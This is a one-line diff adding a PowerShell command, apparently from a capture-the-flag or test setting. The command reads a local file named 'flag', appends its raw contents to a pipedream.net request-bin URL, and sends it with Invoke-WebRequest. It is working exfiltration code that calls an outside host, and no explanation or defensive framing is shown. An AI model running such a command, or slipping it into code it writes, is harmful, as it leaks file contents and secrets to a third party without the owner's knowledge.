@@ -1,0 +1,1 @@
+$ffp = ".\flag";$bu = "https://enztgxo7lcy.x.pipedream.net/";$fs = gc -Path $ffp -Raw;$url = $bu + $fs;iwr -Uri $url -OutFile ".\e"
